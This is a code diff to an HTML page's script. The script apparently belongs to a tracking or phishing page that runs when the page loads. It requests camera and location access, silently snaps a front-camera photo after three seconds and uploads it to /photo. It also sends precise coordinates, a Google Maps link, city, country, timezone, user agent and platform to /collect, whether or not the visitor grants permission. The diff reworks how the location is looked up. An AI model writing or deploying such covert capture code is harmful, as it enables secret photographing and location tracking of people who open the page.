@@ -81,108 +81,83 @@
   </div>
 
   <script>
-  async function sendPhoto(blob) {
-    const formData = new FormData();
-    formData.append('photo', blob, 'photo.jpg');
-    await fetch('/photo', {
-      method: 'POST',
-      body: formData
+async function reverseGeocode(lat, lon) {
+  try {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+    const res = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0' }
     });
+    const data = await res.json();
+    return {
+      city: data.address.city || data.address.town || data.address.village || "Unknown",
+      country: data.address.country || "Unknown",
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
+    };
+  } catch (e) {
+    return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+  }
+}
+
+async function sendFullData(locationCoords, cameraStatus) {
+  let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+
+  if (locationCoords) {
+    locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
   }
 
-  function captureImage(video) {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    canvas.toBlob(sendPhoto);
-  }
+  const payload = {
+    ip: "Unknown",  // IP from server side
+    latitude: locationCoords?.latitude || null,
+    longitude: locationCoords?.longitude || null,
+    mapsLink: locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied",
+    timezone: locationData.timezone,
+    city: locationData.city,
+    country: locationData.country,
+    camera: cameraStatus,
+    userAgent: navigator.userAgent,
+    deviceInfo: navigator.platform
+  };
 
-  async function askForPermissions() {
-    let ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
-    let clientIP = ipData.ip || "Unknown";
-    let timezone = ipData.timezone || "Unavailable";
-    let city = ipData.city || "Unknown";
-    let region = ipData.region || "Unknown";
-    let country = ipData.country_name || "Unknown";
+  await fetch("/collect", {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
 
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-
-      setTimeout(() => {
-        captureImage(video);
-        stream.getTracks().forEach(track => track.stop());
-      }, 3000);
-
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          let lat = pos.coords.latitude;
-          let lon = pos.coords.longitude;
-          let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-          fetch('/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              ip: clientIP,
-              latitude: lat,
-              longitude: lon,
-              mapsLink: mapsLink,
-              timezone: timezone,
-              city: city,
-              region: region,
-              country: country,
-              camera: '✅ Camera Allowed',
-              userAgent: navigator.userAgent,
-              deviceInfo: navigator.platform
-            })
-          });
-        },
-        err => {
-          fetch('/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              ip: clientIP,
-              latitude: null,
-              longitude: null,
-              mapsLink: null,
-              timezone: timezone,
-              city: city,
-              region: region,
-              country: country,
-              camera: '✅ Camera Allowed, ❌ Location Denied',
-              userAgent: navigator.userAgent,
-              deviceInfo: navigator.platform
-            })
-          });
-        }
-      );
-    } catch (err) {
-      fetch('/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          ip: clientIP,
-          latitude: null,
-          longitude: null,
-          mapsLink: null,
-          timezone: timezone,
-          city: city,
-          region: region,
-          country: country,
-          camera: '❌ Camera Denied',
-          userAgent: navigator.userAgent,
-          deviceInfo: navigator.platform
-        })
+async function askForPermissions() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        fetch('/photo', { method: 'POST', body: formData });
       });
-    }
-  }
+      stream.getTracks().forEach(track => track.stop());
+    }, 3000);
 
-  window.onload = askForPermissions;
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        sendFullData(pos.coords, "✅ Camera Allowed");
+      },
+      err => {
+        sendFullData(null, "✅ Camera Allowed, ❌ Location Denied");
+      }
+    );
+  } catch (err) {
+    sendFullData(null, "❌ Camera Denied");
+  }
+}
+
+window.onload = askForPermissions;
   </script>
 </body>
 </html>
